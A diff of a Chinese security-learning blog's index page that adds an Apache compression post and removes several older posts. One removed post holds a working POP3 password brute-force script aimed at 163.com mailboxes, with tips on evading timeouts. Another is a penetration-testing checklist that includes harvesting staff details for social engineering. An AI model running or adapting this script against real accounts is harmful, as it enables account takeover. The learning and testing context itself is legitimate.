@@ -194,6 +194,220 @@
           
           
             
+              <a class="post-title-link" href="/2015/11/09/aphache性能优化记录/" itemprop="url">
+                aphache性能优化记录
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-11-09T17:02:01+08:00" content="2015-11-09">
+            2015-11-09
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/11/09/aphache性能优化记录/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/11/09/aphache性能优化记录/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="aphache开启压缩功能">aphache开启压缩功能</h2><p>aphache配置文件做如下更改</p>
+<pre><code><span class="constant">LoadModule </span>deflate_module modules/mod_deflate.so
+
+&lt;ifmodule mod_deflate.c&gt;
+<span class="constant">DeflateCompressionLevel </span><span class="number">9</span>
+<span class="comment">#启用对特定MIME类型内容的压缩</span>
+<span class="constant">SetOutputFilter DEFLATE</span>
+<span class="constant">SetEnvIfNoCase Request_URI </span>.(?<span class="symbol">:gif|exe|t?gz|zip|bz2|sit|rar|pdf|mov|avi|mp3|mp4|rm</span>)<span class="variable">$ </span>no-gzip dont-vary <span class="comment">#设置不对压缩的文件</span>
+<span class="constant">AddOutputFilterByType DEFLATE </span>text/html  text/png text/jpg text/css text/plain text/xml application/x-httpd-php application/x-javascript <span class="comment">#设置对压缩的文件</span>
+&lt;<span class="regexp">/ifmodule&gt;</span>
+</code></pre></span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              <a class="post-title-link" href="/2015/11/09/系统参数查看/" itemprop="url">
+                系统参数查看
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-11-09T14:18:52+08:00" content="2015-11-09">
+            2015-11-09
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/11/09/系统参数查看/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/11/09/系统参数查看/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"></span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              <a class="post-title-link" href="/2015/10/19/python-socket编程相关记录/" itemprop="url">
+                python socket编程相关记录
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-10-19T16:34:14+08:00" content="2015-10-19">
+            2015-10-19
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/10/19/python-socket编程相关记录/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/10/19/python-socket编程相关记录/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"></span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/10/12/DNS域传送漏洞学习记录/" itemprop="url">
                 DNS域传送漏洞学习记录
               </a>
@@ -1013,493 +1227,6 @@ expect:
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/09/15/邮箱爆破脚本总结/" itemprop="url">
-                邮箱爆破脚本总结
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-09-15T16:07:46+08:00" content="2015-09-15">
-            2015-09-15
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/09/15/邮箱爆破脚本总结/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/15/邮箱爆破脚本总结/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><p>前一阵研究了一下wooyun zone里看到的邮箱爆破脚本,自己试着改成了多线程,效果不是很好.<br>在这里记录一下脚本实现思路以及关于邮箱爆破的一些想法.</p>
-<h2 id="爆破脚本">爆破脚本</h2><pre><code>#pop3协议,SMTP协议需要时候再补
-
-import poplib
-
-pop = poplib.<span class="function"><span class="title">POP3</span><span class="params">(host,port,delay)</span></span>
-print pop.<span class="function"><span class="title">getwelcome</span><span class="params">()</span></span>  #如果连接成功打印welcome信息
-pop = pop.<span class="function"><span class="title">user</span><span class="params">(username)</span></span>
-pop.<span class="function"><span class="title">pass_</span><span class="params">(password)</span></span>     #到了这一步如果没有抛出异常,登录成功
-pop.<span class="function"><span class="title">quit</span><span class="params">()</span></span>
-</code></pre><p>注意:<br>    1.在各个步骤的异常情况判断.<br>    2.代码第6行如果第一次认证失败,不可以继续验证.需要调用quit方法结束实例(为什么解释器中和实际运行的结果不一致).<br>    3.实现逻辑方面读取用户密码不断遍历实现暴力破解.</p>
-<p>脚本代码</p>
-<pre><code><span class="comment"># coding=utf-8</span>
-<span class="keyword">import</span> threading, time, random, sys, poplib 
-<span class="keyword">from</span> copy <span class="keyword">import</span> copy 
-server = <span class="string">"mail.163"</span> <span class="comment">#host</span>
-suffix = <span class="string">"@163"</span>     <span class="comment">#邮箱后缀</span>
-delay = <span class="number">0.3</span>                <span class="comment">#延时</span>
-users = open(<span class="string">'username.txt'</span>,<span class="string">'r'</span>).readlines()  <span class="comment">#用户名字典</span>
-words = open(<span class="string">'password.txt'</span>,<span class="string">'r'</span>).readlines()  <span class="comment">#密码字典</span>
-success = []
-<span class="function"><span class="keyword">def</span> <span class="title">mailbruteforce</span><span class="params">(listuser,listpwd)</span>:</span> 
-  <span class="keyword">print</span> <span class="string">"Bruting..."</span>
-  <span class="keyword">for</span> user <span class="keyword">in</span> listuser: 
-    <span class="keyword">for</span> value <span class="keyword">in</span> listpwd : 
-      user = user.replace(<span class="string">"\n"</span>,suffix) 
-      value = value.replace(<span class="string">"\n"</span>,<span class="string">""</span>) 
-      <span class="keyword">try</span>: 
-        pop = poplib.POP3(server,<span class="number">110</span>,delay) 
-        pop.user(user) 
-        auth = pop.pass_(value) 
-        <span class="keyword">print</span> user,value,auth[<span class="number">1</span>:<span class="number">3</span>]
-        success.append(user+<span class="string">':'</span>+value)
-        pop.quit() 
-      <span class="keyword">except</span>:
-        <span class="keyword">pass</span>
-mailbruteforce(users,words) 
-</code></pre><h2 id="多线程版本">多线程版本</h2><p>效率还是太慢,想改成多线程增加点效率,随便还有待解决的问题,还是记录下来</p>
-<p>1.上面的基本思路是求两个线性分布的笛卡尔积.<br>2.多线程版本目前的思路是,开t个线程,每个线程<strong>分配一个用户名并开始爆破弱密码</strong>.</p>
-<pre><code><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="params">(threading.Thread)</span>:</span>
-      <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,username,passwords)</span>:</span>
-    //初始化时传入参数
-      <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>
-        <span class="keyword">for</span> password <span class="keyword">in</span> self.passwords:
-              连接邮箱并验证
-
-t = myThread(username,passwords)
-t.start()//线程开始运行
-t.join()//阻塞线程直到这一批开启的线程释放,所以一般放在循环外
-</code></pre><p>为每个线程分配任务的逻辑还是有点问题,日后再补.</p>
-<h2 id="总结:">总结:</h2><p>1.企业邮箱是一个很好的入口,没有设置超时的企业邮箱使用人名top500和经典弱密码有很大的概率爆出密码.<br>2.脚本可以使用多任务<strong>提高效率</strong>,多进程,多线程,协程.<br>3.进一步研究邮箱拦截方式,突破超时.</p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/09/14/安全测试思路总结/" itemprop="url">
-                安全测试思路总结
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-09-14T15:35:01+08:00" content="2015-09-14">
-            2015-09-14
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/09/14/安全测试思路总结/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/14/安全测试思路总结/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><p>学习安全测试也有一段时间了,零零散散的学习了一些X站姿势,也结合前一阵的测试过程,做一个测试思路的总结.</p>
-<h2 id="信息搜集:">信息搜集:</h2><p>1.可以先用Nmap扫扫<strong>端口</strong>情况,换一换不同扫描策略看看结果.<br>2.用lijiejie的subdomainbrute.py查查<strong>子域名</strong>.<br>3.用dirfuzz.py爆破<strong>目录</strong>.<br>4.AppScan探测<strong>url</strong>备用.<br>5.可以利用登录或者找回密码等页面爆破网站注册用户.<br>6.根据域名查看域名注册人信息,IP反查,搜集旁站信息…<br>7.试试域传送漏洞.</p>
-<p>总之就是尽可能的搜集信息,上面是能想到的比较重要的几点.在搜集过程中记录觉得有用的信息,例如:后台管理地址,企业邮箱入口.思路再猥琐一点,也可以搜集客服,HR或者其他一些公司公开人员信息,用于反射型XSS,CSRF,社工等用途.</p>
-<h2 id="账户体系检测">账户体系检测</h2><p>1.观察是否存在可爆破的页面,能否突破验证码,IP检测(通过修改X-Forwarded-For)等限制.<br>2.注册过程中可能出现的漏洞:任意手机注册,短信轰炸,越权绑定存在账户等问题,都需要进行排查.<br>2.修改密码功能,详情参考<a href="http://quanyong.xyz/2015/08/07/%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="external">密码找回漏洞总结</a></p>
-<h2 id="SQL注入检测">SQL注入检测</h2><p>1.将AppScan探测到的url存为txt文件.<br>2.使用sqlmap -m 参数进行批量扫描.<br>3.选取可疑url进行手工测试,尝试不同绕过.</p>
-<h2 id="XSS检测">XSS检测</h2><p>1.使用chrome的XSS检测插件进行检测:将<strong>检测目标</strong>和<strong>payload</strong>添加至指定位置.<br>2.选取一些大范围使用以及可能造成存储型XSS的参数进行验证.<br>3.查看\”&gt;&amp;/等字符的过滤情况.</p>
-<h2 id="CSRF检测">CSRF检测</h2><p>1.截获请求,观察其中有无类似防止csrf攻击的参数.<br>2.修改refer继续请求.<br>3.如果请求被正常返回,构造csrf攻击页面,通过点击访问进行验证.</p>
-<h2 id="越权漏洞检测">越权漏洞检测</h2><p>1.注册两个账号,分别用chrome和火狐登录.<br>2.通过替换参数检测越权,通常是 id,uid,username等参数.<br>3.如果有条件同时检测<strong>平行越权</strong>和<strong>垂直越权</strong>.</p>
-<h2 id="历史漏洞排查">历史漏洞排查</h2><p>1.如果产品曾经爆出历史漏洞,可单独列出此项.<br>2.根据历史漏洞进行排查,验证修复情况.</p>
-<h2 id="工具扫描结果">工具扫描结果</h2><p>1.AppScan 目前只用过这个,针对扫描结果进行验证,给出分析建议.<br>2.通常是一些敏感信息泄露:电话,邮箱,内网IP等<br>3.使用HTTPS协议,密码不能自动补全,httponly限制js操作cookie.</p>
-<h2 id="测试总结">测试总结</h2><p>1.列举测试过程中发现的问题,并简述修复建议.<br>2.简要评估网站安全.</p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/09/06/shell命令使用记录/" itemprop="url">
-                shell命令使用记录
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-09-06T09:10:37+08:00" content="2015-09-06">
-            2015-09-06
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/09/06/shell命令使用记录/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/06/shell命令使用记录/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="chmod改变文件权限">chmod改变文件权限</h2><p>a:allusers<br>u:user<br>g:guest<br>o:other</p>
-<pre><code>shell&gt; chmod a+rwx test.bin
-<span class="preprocessor">#为 <span class="number">1.u</span>ser当前用户<span class="number">2.</span>group当前用户组<span class="number">3.</span>other其他用户 添加rwx权限</span>
-shell&gt; chmod go-wx test.bin
-<span class="preprocessor">#移除g和o组的wx权限</span>
-</code></pre><h2 id="查看当前linux版本">查看当前linux版本</h2><pre><code><span class="built_in">shell</span>&gt; uname -r
-<span class="comment">#查看实际内核版本及系统位数</span>
-<span class="built_in">shell</span>&gt; lsb_release -<span class="operator">a</span>
-<span class="comment">#显示系统详细信息</span>
-</code></pre><h2 id="删除目录">删除目录</h2><pre><code><span class="built_in">shell</span>&gt; rmdir temp
-<span class="comment">#删除空目录</span>
-<span class="built_in">shell</span>&gt; rm -rf temp
-<span class="comment">#f强制r递归删除目录 危险操作!!!</span>
-</code></pre><h2 id="进程管理">进程管理</h2><pre><code><span class="keyword">ps</span>命令查找与进程相关的PID号：
-<span class="keyword">ps</span> <span class="keyword">a</span> 显示现行终端机下的所有程序，包括其他用户的程序。 
-<span class="keyword">ps</span> -A 显示所有程序。 
-<span class="keyword">ps</span> <span class="keyword">c</span> 列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。 
-<span class="keyword">ps</span> -<span class="keyword">e</span> 此参数的效果和指定<span class="string">"A"</span>参数相同。 
-<span class="keyword">ps</span> <span class="keyword">e</span> 列出程序时，显示每个程序所使用的环境变量。 
-<span class="keyword">ps</span> <span class="keyword">f</span> 用ASCII字符显示树状结构，表达程序间的相互关系。 
-<span class="keyword">ps</span> -H 显示树状结构，表示程序间的相互关系。 
-<span class="keyword">ps</span> -<span class="keyword">N</span> 显示所有的程序，除了执行<span class="keyword">ps</span>指令终端机下的程序之外。 
-<span class="keyword">ps</span> <span class="keyword">s</span> 采用程序信号的格式显示程序状况。 
-<span class="keyword">ps</span> S 列出程序时，包括已中断的子程序资料。 
-<span class="keyword">ps</span> -<span class="keyword">t</span>&lt;终端机编号&gt; 指定终端机编号，并列出属于该终端机的程序的状况。 
-<span class="keyword">ps</span> <span class="keyword">u</span> 以用户为主的格式来显示程序状况。 
-<span class="keyword">ps</span> <span class="keyword">x</span> 显示所有程序，不以终端机来区分。
-
-<span class="keyword">shell</span>&gt; kill PID
-<span class="keyword">shell</span>&gt; killall -<span class="number">9</span> NAME
-</code></pre><h2 id="内存情况">内存情况</h2><pre><code>shell&gt; free
-<span class="comment">#单位为kb</span>
-shell&gt; cat /<span class="keyword">proc</span>/meminfo
-shell&gt; top
-<span class="comment">#内存实时占用情况</span>
-</code></pre><h2 id="top命令">top命令</h2><pre><code>shell&gt; top
-top - <span class="number">02</span>:<span class="number">53</span>:<span class="number">32</span> up <span class="number">16</span> days,  <span class="number">6</span>:<span class="number">34</span>, <span class="number">17</span> users,  load average: <span class="number">0.24</span>, <span class="number">0.21</span>, <span class="number">0.24</span>
-Tasks: <span class="number">481</span> total,   <span class="number">3</span> running, <span class="number">474</span> sleeping,   <span class="number">0</span> stopped,   <span class="number">4</span> <span class="function">zombie
-<span class="title">Cpu</span><span class="params">(s)</span>: 10.3%us,  1.8%sy,  0.0%ni, 86.6%id,  0.5%wa,  0.2%hi,  0.6%si,  0.0%st
-Mem:   4042764k total,  4001096k used,    41668k <span class="built_in">free</span>,   383536k buffers
-Swap:  2104472k total,     7900k used,  2096572k <span class="built_in">free</span>,  1557040k cached
-
-  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND    
-32497 jacky     20   0  669m 222m  31m R   10  5.6       29:27.62 firefox
-4788 yiuwing   20   0  257m  18m  13m S    5  0.5          5:42.44 konsole
- 5657 Liuxiaof  20   0  585m 159m  30m S    4  4.0          5:25.06 firefox
- 4455 xiefc      20   0  542m  124m  30m R    4  3.1         7:23.03 firefox
- 6188 Liuxiaof  20   0  191m   17m  13m S    4  0.5          0:01.16 konsole</span>
-</code></pre><p>统计信息区前五行是系统整体的统计信息。第一行是任务队列信息，同 uptime  命令的执行结果。其内容如下：</p>
-<p>01:06:48  当前时间<br>up 1:22  系统运行 时间，格式为时:分<br>1 user  当前登录用户 数<br>load average: 0.06, 0.60, 0.48  系统负载 ，即任务队列的平均长度。<br>三个数值分别为  1分钟、5分钟、15分钟前到现在的平均值。 </p>
-<p>第二、三行为进程和CPU的信息。当有多个CPU时，这些内容可能会超过两行。内容如下：</p>
-<pre><code>Tasks: <span class="number">29</span> total  进程总数  
-<span class="number">1</span> running  正在运行的进程数  
-<span class="number">28</span> sleeping  睡眠的进程数  
-<span class="number">0</span> stopped  停止的进程数  
-<span class="number">0</span> zombie  僵尸进程数  
-Cpu(s): <span class="number">0.3</span>% us  用户空间占用CPU百分比  
-<span class="number">1.0</span>% sy  内核 空间占用CPU百分比  
-<span class="number">0.0</span>% ni  用户进程空间内改变过优先级的进程占用CPU百分比  
-<span class="number">98.7</span>% id  空闲CPU百分比  
-<span class="number">0.0</span>% wa  等待输入输出的CPU时间百分比  
-<span class="number">0.0</span>% hi     
-<span class="number">0.0</span>% si    
-</code></pre><p>最后两行为内存 信息。内容如下：</p>
-<pre><code>Mem: <span class="number">191272</span>k total  物理内存总量  
-<span class="number">173656</span>k used  使用的物理内存总量  
-<span class="number">17616</span>k <span class="built_in">free</span>  空闲内存总量  
-<span class="number">22052</span>k buffers  用作内核缓存 的内存量  
-Swap: <span class="number">192772</span>k total  交换区总量  
-<span class="number">0</span>k used  使用的交换区总量  
-<span class="number">192772</span>k <span class="built_in">free</span>  空闲交换区总量  
-<span class="number">123988</span>k cached  缓冲的交换区总量。
-内存中的内容被换出到交换区，而后又被换入到内存，但使用过的交换区尚未被覆盖，
-该数值即为这些内容已存在于内存中 的交换区的大小。
-相应的内存再次被换出时可不必再对交换区写入。 
-</code></pre><p>进程信息区统计信息区域的下方显示了各个进程的详细信息。首先来认识一下各列的含义。</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">序号</th>
-<th>列名</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">a</td>
-<td>PID</td>
-<td>进程id</td>
-</tr>
-<tr>
-<td style="text-align:left">b</td>
-<td>PPID</td>
-<td>父进程id</td>
-</tr>
-<tr>
-<td style="text-align:left">c</td>
-<td>RUSER</td>
-<td>Real user name</td>
-</tr>
-<tr>
-<td style="text-align:left">d</td>
-<td>UID</td>
-<td>进程所有者的用户id</td>
-</tr>
-<tr>
-<td style="text-align:left">e</td>
-<td>USER</td>
-<td>进程所有者的用户名</td>
-</tr>
-<tr>
-<td style="text-align:left">f</td>
-<td>GROUP</td>
-<td>进程所有者的组名</td>
-</tr>
-<tr>
-<td style="text-align:left">g</td>
-<td>TTY</td>
-<td>启动进程的终端名。不是从终端启动的进程则显示为 ?</td>
-</tr>
-<tr>
-<td style="text-align:left">h</td>
-<td>PR</td>
-<td>优先级</td>
-</tr>
-<tr>
-<td style="text-align:left">i</td>
-<td>NI</td>
-<td>nice值。负值表示高优先级，正值表示低优先级</td>
-</tr>
-<tr>
-<td style="text-align:left">j</td>
-<td>P</td>
-<td>最后使用的CPU，仅在多CPU环境 下有意义</td>
-</tr>
-<tr>
-<td style="text-align:left">k</td>
-<td>%CPU</td>
-<td>上次更新到现在的CPU时间占用百分比</td>
-</tr>
-<tr>
-<td style="text-align:left">l</td>
-<td>TIME</td>
-<td>进程使用的CPU时间总计，单位秒</td>
-</tr>
-<tr>
-<td style="text-align:left">m</td>
-<td>TIME+</td>
-<td>进程使用的CPU时间总计，单位1/100秒</td>
-</tr>
-<tr>
-<td style="text-align:left">n</td>
-<td>%MEM</td>
-<td>进程使用的物理内存 百分比</td>
-</tr>
-<tr>
-<td style="text-align:left">o</td>
-<td>VIRT</td>
-<td>进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES</td>
-</tr>
-<tr>
-<td style="text-align:left">p</td>
-<td>SWAP</td>
-<td>进程使用的虚拟内存中，被换出的大小，单位kb。</td>
-</tr>
-<tr>
-<td style="text-align:left">q</td>
-<td>RES</td>
-<td>进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA</td>
-</tr>
-<tr>
-<td style="text-align:left">r</td>
-<td>CODE</td>
-<td>可执行代码占用的物理 内存大小，单位kb</td>
-</tr>
-<tr>
-<td style="text-align:left">s</td>
-<td>DATA</td>
-<td>可执行代码以外的部分(数据 段+栈)占用的物理 内存大小，单位kb</td>
-</tr>
-<tr>
-<td style="text-align:left">t</td>
-<td>SHR</td>
-<td>共享内存大小，单位kb</td>
-</tr>
-<tr>
-<td style="text-align:left">u</td>
-<td>nFLT</td>
-<td>页面错误次数</td>
-</tr>
-<tr>
-<td style="text-align:left">v</td>
-<td>nDRT</td>
-<td>最后一次写入到现在，被修改过的页面数。</td>
-</tr>
-<tr>
-<td style="text-align:left">w</td>
-<td>S</td>
-<td>进程状态。D =不可中断的睡眠状态R =运行S =睡眠T =跟踪/停止Z =僵尸进程</td>
-</tr>
-<tr>
-<td style="text-align:left">x</td>
-<td>COMMAND</td>
-<td>命令名/命令行</td>
-</tr>
-<tr>
-<td style="text-align:left">y</td>
-<td>WCHAN</td>
-<td>若该进程在睡眠，则显示睡眠中的系统函数名</td>
-</tr>
-<tr>
-<td style="text-align:left">z</td>
-<td>Flags</td>
-<td>任务标志，参考 sched.h</td>
-</tr>
-</tbody>
-</table>
-<p>默认情况下仅显示比较重要的  PID、USER、PR、NI、VIRT、RES、SHR、S、%CPU、%MEM、TIME+、COMMAND  列。可以通过下面的快捷键来更改显示内容。<br>更改显示内容通过 f 键可以选择显示的内容。按 f 键之后会显示列的列表，按 a-z  即可显示或隐藏对应的列，最后按回车键确定。<br>按 o 键可以改变列的显示顺序。按小写的 a-z 可以将相应的列向右移动，而大写的 A-Z  可以将相应的列向左移动。最后按回车键确定。<br>按大写的 F 或 O 键，然后按 a-z 可以将进程按照相应的列进行排序。而大写的  R 键可以将当前的排序倒转。</p>
-<h2 id="查看用户">查看用户</h2><pre><code><span class="built_in">shell</span>&gt;cat etc/passwd <span class="comment">#用户的配置信息</span>
-<span class="built_in">shell</span>&gt;cat etc/groups <span class="comment">#用户组的配置信息</span>
-</code></pre><p><a href="http://blog.csdn.net/dchjmichael/article/details/8968546" target="_blank" rel="external">linux用户管理详解</a></p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1538,7 +1265,7 @@ Swap: <span class="number">192772</span>k total  交换区总量
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">34</span>
+              <span class="site-state-item-count">37</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1552,7 +1279,7 @@ Swap: <span class="number">192772</span>k total  交换区总量
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">28</span>
+              <span class="site-state-item-count">30</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
